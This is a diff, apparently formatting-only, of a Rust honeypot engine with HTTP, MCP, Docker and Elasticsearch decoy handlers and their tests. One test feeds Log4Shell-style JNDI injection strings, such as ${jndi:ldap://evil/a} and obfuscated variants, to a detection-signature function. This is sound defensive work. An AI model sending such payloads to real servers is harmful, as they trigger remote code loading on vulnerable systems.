@@ -107,7 +107,10 @@ impl HoneypotHandle {
     /// 幂等：已停止的行直接返回 Ok。
     pub fn stop_listener(&self, name: &str) -> Result<(), String> {
         let (desired_state, desired_tx) = {
-            let reg = self.registry.lock().map_err(|_| "注册表锁中毒".to_string())?;
+            let reg = self
+                .registry
+                .lock()
+                .map_err(|_| "注册表锁中毒".to_string())?;
             reg.iter()
                 .find(|r| r.cfg.name == name)
                 .map(|r| (r.desired_state.clone(), r.desired_tx.clone()))
@@ -123,7 +126,10 @@ impl HoneypotHandle {
     /// 停机）→ 重拉。非阻塞；bind 失败留 engine 错误事件，状态以 `listeners()` 为准。
     pub fn start_listener(&self, name: &str) -> Result<(), String> {
         let (cfg, running, task_alive, desired_state, desired_tx, shutdown_rx) = {
-            let reg = self.registry.lock().map_err(|_| "注册表锁中毒".to_string())?;
+            let reg = self
+                .registry
+                .lock()
+                .map_err(|_| "注册表锁中毒".to_string())?;
             let r = reg
                 .iter()
                 .find(|r| r.cfg.name == name)
@@ -401,8 +407,7 @@ async fn run_listener(
                 continue;
             };
             // 交互会话占独立小额预算：满额优雅拒绝并留痕（对齐 OpenSSH 正常拒连语义）
-            let interactive_permit =
-                if is_interactive_session(&l.kind, ctx.shell.as_deref()) {
+            let interactive_permit = if is_interactive_session(&l.kind, ctx.shell.as_deref()) {
                 match interactive_sem.clone().try_acquire_owned() {
                     Ok(p) => Some(p),
                     Err(_) => {
@@ -506,8 +511,13 @@ async fn handle_conn(
         }
         "http" => {
             let tpl = ctx.templates.as_ref().and_then(|t| t.http_tpl(&listener));
-            http::http_session(&mut stream, ctx.canary.as_deref(), tpl.as_ref(), &ctx.fp.http_server)
-                .await
+            http::http_session(
+                &mut stream,
+                ctx.canary.as_deref(),
+                tpl.as_ref(),
+                &ctx.fp.http_server,
+            )
+            .await
         }
         // F791：MCP 蜜罐（JSON-RPC / Streamable HTTP + 旧 SSE 传输）
         "mcp" => match mcp::mcp_session(&mut stream, ctx.canary.as_deref()).await {
@@ -518,7 +528,14 @@ async fn handle_conn(
             Err(e) => Err(e),
         },
         // F794a：Docker Engine API 蜜罐（假 daemon + 容器创建 TTP 定罪）
-        "docker" => match http::http_json_session(&mut stream, ctx.canary.as_deref(), "Docker", docker::route).await {
+        "docker" => match http::http_json_session(
+            &mut stream,
+            ctx.canary.as_deref(),
+            "Docker",
+            docker::route,
+        )
+        .await
+        {
             Ok((outcome, g)) => {
                 ghost = g;
                 Ok(outcome)
@@ -526,7 +543,14 @@ async fn handle_conn(
             Err(e) => Err(e),
         },
         // F794a：Elasticsearch 蜜罐（canary 集群形态 + 写入/脚本注入定罪）
-        "elasticsearch" => match http::http_json_session(&mut stream, ctx.canary.as_deref(), "ES", elasticsearch::route).await {
+        "elasticsearch" => match http::http_json_session(
+            &mut stream,
+            ctx.canary.as_deref(),
+            "ES",
+            elasticsearch::route,
+        )
+        .await
+        {
             Ok((outcome, g)) => {
                 ghost = g;
                 Ok(outcome)
@@ -642,8 +666,13 @@ mod tests {
     /// F794b①：JNDI 载荷全域签名——命中/混淆变体/多字节边界不 panic
     #[test]
     fn jndi_signature_detects_and_bounds() {
-        assert!(jndi_signature_hit("GET /x HTTP/1.1
-User-Agent: ${jndi:ldap://evil/a}").is_some());
+        assert!(
+            jndi_signature_hit(
+                "GET /x HTTP/1.1
+User-Agent: ${jndi:ldap://evil/a}"
+            )
+            .is_some()
+        );
         assert!(jndi_signature_hit("x ${LOWER:JNDI:ldap://a} y").is_some());
         assert!(jndi_signature_hit("x ${upper:jndi:ldap} y").is_some());
         assert!(jndi_signature_hit("GET / HTTP/1.1").is_none());
@@ -662,7 +691,10 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
         for kind in ["http", "telnet", "generic", "mysql", "redis"] {
             assert!(!is_interactive_session(kind, None), "{kind} 应为低交互");
         }
-        assert!(!is_interactive_session("ssh", None), "shell 关闭时 ssh 低交互");
+        assert!(
+            !is_interactive_session("ssh", None),
+            "shell 关闭时 ssh 低交互"
+        );
         let tmp = std::env::temp_dir().join(format!("asg-shell-rt-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&tmp);
         let rt = crate::shell::start_runtime(
@@ -790,7 +822,10 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
                 break;
             }
         }
-        assert!(seen.contains("deploy@debian-11:~$"), "应收到假 prompt: {seen}");
+        assert!(
+            seen.contains("deploy@debian-11:~$"),
+            "应收到假 prompt: {seen}"
+        );
 
         // 白名单命令
         c.write_all(b"whoami\r\n").await.unwrap();
@@ -829,7 +864,10 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
                 );
                 assert_eq!(steps[0].command, "whoami");
                 assert_eq!(steps[1].command, "exit");
-                assert!(!payload.contains("hunter2"), "telnet 口令明文不得落 payload");
+                assert!(
+                    !payload.contains("hunter2"),
+                    "telnet 口令明文不得落 payload"
+                );
                 break;
             }
         }
@@ -882,8 +920,7 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
                 .expect("超时未收到蜜罐事件")
                 .expect("事件通道关闭");
             if let E3::HoneypotHit {
-                summary,
-                payload, ..
+                summary, payload, ..
             } = ev
                 && !payload.is_empty()
             {
@@ -909,8 +946,18 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
         let cfg = HoneypotConfig {
             enabled: true,
             listeners: vec![
-                ListenerConfig { name: "telnet".into(), port, kind: "telnet".into(), enabled: true },
-                ListenerConfig { name: "redis".into(), port: 6390, kind: "redis".into(), enabled: false },
+                ListenerConfig {
+                    name: "telnet".into(),
+                    port,
+                    kind: "telnet".into(),
+                    enabled: true,
+                },
+                ListenerConfig {
+                    name: "redis".into(),
+                    port: 6390,
+                    kind: "redis".into(),
+                    enabled: false,
+                },
             ],
             ..Default::default()
         };
@@ -934,7 +981,10 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
         let mut c = None;
         for _ in 0..40 {
             match tokio::net::TcpStream::connect(("127.0.0.1", port)).await {
-                Ok(v) => { c = Some(v); break; }
+                Ok(v) => {
+                    c = Some(v);
+                    break;
+                }
                 Err(_) => tokio::time::sleep(Duration::from_millis(50)).await,
             }
         }
@@ -951,9 +1001,14 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
             }
             tokio::time::sleep(Duration::from_millis(50)).await;
         }
-        assert!(!telnet.running.load(Ordering::Relaxed), "热停后 running 应为 false");
         assert!(
-            tokio::net::TcpStream::connect(("127.0.0.1", port)).await.is_err(),
+            !telnet.running.load(Ordering::Relaxed),
+            "热停后 running 应为 false"
+        );
+        assert!(
+            tokio::net::TcpStream::connect(("127.0.0.1", port))
+                .await
+                .is_err(),
             "热停后端口应不可连"
         );
 
@@ -971,14 +1026,21 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
         let mut c = None;
         for _ in 0..40 {
             match tokio::net::TcpStream::connect(("127.0.0.1", port)).await {
-                Ok(v) => { c = Some(v); break; }
+                Ok(v) => {
+                    c = Some(v);
+                    break;
+                }
                 Err(_) => tokio::time::sleep(Duration::from_millis(50)).await,
             }
         }
         assert!(c.is_some(), "热启后应可连");
         if let Some(mut c) = c {
-            let _ = c.write_all(b"admin
-").await;
+            let _ = c
+                .write_all(
+                    b"admin
+",
+                )
+                .await;
         }
 
         // 幂等/边界：重复热停 Ok、运行中热启 Err、未知名 Err
@@ -991,7 +1053,11 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
         handle.stop();
         tokio::time::sleep(Duration::from_millis(200)).await;
         for l in handle.listeners() {
-            assert!(!l.running.load(Ordering::Relaxed), "{} 应随全局停机退出", l.name);
+            assert!(
+                !l.running.load(Ordering::Relaxed),
+                "{} 应随全局停机退出",
+                l.name
+            );
         }
     }
 
@@ -1096,7 +1162,10 @@ User-Agent: ${jndi:ldap://evil/a}").is_some());
         // 等监听就绪
         let mut ready = false;
         for _ in 0..40 {
-            if tokio::net::TcpStream::connect(("127.0.0.1", port)).await.is_ok() {
+            if tokio::net::TcpStream::connect(("127.0.0.1", port))
+                .await
+                .is_ok()
+            {
                 ready = true;
                 break;
             }
